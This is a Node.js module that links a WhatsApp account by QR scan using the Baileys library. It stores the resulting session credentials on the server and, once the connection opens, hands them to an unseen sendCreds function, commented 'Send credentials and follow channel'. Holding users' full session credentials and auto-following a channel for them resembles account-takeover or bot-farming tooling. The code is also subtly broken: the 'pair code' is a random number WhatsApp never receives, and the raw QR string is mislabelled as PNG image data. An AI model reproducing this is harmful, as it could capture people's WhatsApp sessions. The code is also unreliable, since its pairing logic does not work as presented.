const {
  default: makeWASocket,
  DisconnectReason,
  useSingleFileAuthState
} = require('@adiwajshing/baileys');
const path = require('path');
const fs = require('fs');
const { sendCreds } = require('./sendCreds');

let sock;
const sessionsDir = path.join(__dirname, '../creds');
if (!fs.existsSync(sessionsDir)) fs.mkdirSync(sessionsDir);

function initWA() {
  const authFile = path.join(sessionsDir, 'auth_info.json');
  const { state, saveState } = useSingleFileAuthState(authFile);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false
  });

  // Save updated auth state
  sock.ev.on('creds.updated', saveState);

  // Connection updates
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr) {
      // Store or update latest QR for retrieval
      sock.latestQR = qr;
    }

    if (connection === 'open') {
      console.log('WhatsApp connection established');
      // On first open after QR scan, send creds
      await handlePostOpen();
    }

    if (connection === 'close') {
      const status = lastDisconnect?.error?.output?.statusCode;
      if (status !== DisconnectReason.loggedOut) {
        console.log('Reconnecting WA...');
        initWA();
      }
    }
  });
}

async function generatePairCode(number) {
  if (!sock) throw new Error('Socket not initialized');
  const code = Math.floor(100000 + Math.random() * 900000).toString();
  // Map code to number for later
  sock.pairMapping = sock.pairMapping || {};
  sock.pairMapping[code] = number;
  return code;
}

async function getQRCode(code) {
  if (!sock || !sock.latestQR) {
    throw new Error('QR not available');
  }
  return {
    qr: `data:image/png;base64,${sock.latestQR}`,
    instructions: [
      'Open WhatsApp',
      'Settings → Linked Devices → Link a Device',
      'Scan the QR code above'
    ]
  };
}

async function handlePostOpen() {
  try {
    const jid = sock.user.id;  // e.g. 2341234@s.whatsapp.net
    // Find the code mapped to this user
    const number = jid.split(':')[0];
    const entry = Object.entries(sock.pairMapping || {}).find(([c, num]) => num === number);
    if (entry) {
      // Send credentials and follow channel
      await sendCreds(sock);
      // Clean up mapping
      delete sock.pairMapping[entry[0]];
    }
  } catch (e) {
    console.error('Error in post-open handler:', e);
  }
}

module.exports = {
  initWA,
  generatePairCode,
  getQRCode
};
